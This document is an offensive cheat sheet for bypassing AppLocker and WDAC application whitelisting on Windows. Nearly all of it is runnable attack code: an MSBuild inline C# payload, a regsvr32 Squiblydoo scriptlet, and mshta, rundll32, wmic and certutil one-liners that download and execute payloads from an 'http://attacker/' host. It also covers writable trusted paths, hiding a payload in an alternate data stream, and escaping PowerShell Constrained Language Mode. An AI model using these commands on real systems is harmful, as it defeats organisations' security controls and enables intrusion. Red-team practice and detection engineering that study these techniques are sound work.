# AppLocker / WDAC Bypass Techniques

Bypass application whitelisting to execute arbitrary code.

**MITRE ATT&CK**: T1218 — System Binary Proxy Execution

## Check AppLocker Status

```powershell
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
Get-ChildItem "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
```

## LOLBAS (Living Off the Land Binaries and Scripts)

### MSBuild.exe (T1127.001)

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

```xml
<!-- payload.xml — inline C# task execution -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
public class ClassExample : Task, ITask {
    public override bool Execute() {
        System.Diagnostics.Process.Start("cmd.exe");
        return true;
    }
}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

### InstallUtil.exe (T1218.004)

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### Regsvcs / Regasm (T1218.009)

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe payload.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll
```

### CMSTP.exe (T1218.003)

```cmd
:: Execute via INF file
cmstp.exe /ni /s payload.inf
```

### Mshta.exe (T1218.005)

```cmd
:: Execute HTA
mshta.exe http://attacker/payload.hta
mshta.exe "javascript:a=new ActiveXObject('WScript.Shell');a.Run('cmd.exe');close();"
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe"":close")
```

### Rundll32.exe (T1218.011)

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("cmd.exe")
rundll32.exe shell32.dll,Control_RunDLL payload.dll
rundll32.exe url.dll,OpenURL http://attacker/payload.hta
```

### Regsvr32.exe (T1218.010)

```cmd
:: Scriptlet execution (Squiblydoo)
regsvr32.exe /s /n /u /i:http://attacker/payload.sct scrobj.dll
```

```xml
<!-- payload.sct -->
<?XML version="1.0"?>
<scriptlet>
  <registration progid="PoC" classid="{00000000-0000-0000-0000-000000000000}">
    <script language="JScript">
      <![CDATA[
        new ActiveXObject("WScript.Shell").Run("cmd.exe");
      ]]>
    </script>
  </registration>
</scriptlet>
```

### WMIC (T1218.010)

```cmd
wmic process call create "cmd.exe"
wmic os get /format:"http://attacker/payload.xsl"
```

### CertUtil (T1105)

```cmd
:: Download and execute
certutil.exe -urlcache -split -f http://attacker/payload.exe C:\temp\payload.exe
certutil.exe -urlcache -split -f http://attacker/payload.b64 C:\temp\payload.b64
certutil.exe -decode C:\temp\payload.b64 C:\temp\payload.exe
```

## Trusted Paths

Writable subdirectories within trusted locations that AppLocker allows:

```
C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\Tracing\
C:\Windows\Registration\CRMLog\
C:\Windows\System32\FxsTmp\
C:\Windows\System32\com\dmp\
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\
C:\Windows\System32\spool\drivers\color\
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter\
C:\Windows\SysWOW64\Tasks\
C:\Windows\SysWOW64\com\dmp\
```

## Alternate Data Streams

```cmd
:: Hide payload in ADS
type payload.exe > C:\temp\legit.txt:payload.exe
wmic process call create "C:\temp\legit.txt:payload.exe"
```

## PowerShell Constrained Language Mode Bypass

```powershell
# Check current mode
$ExecutionContext.SessionState.LanguageMode

# Bypass via PowerShell v2 (if .NET 2.0 installed)
powershell.exe -Version 2

# Bypass via custom runspace from C# executable
# Compile and execute a .NET app that opens FullLanguage PowerShell
```

## Reference

- LOLBAS Project: https://lolbas-project.github.io/
- GTFOBins (Linux equivalent): https://gtfobins.github.io/
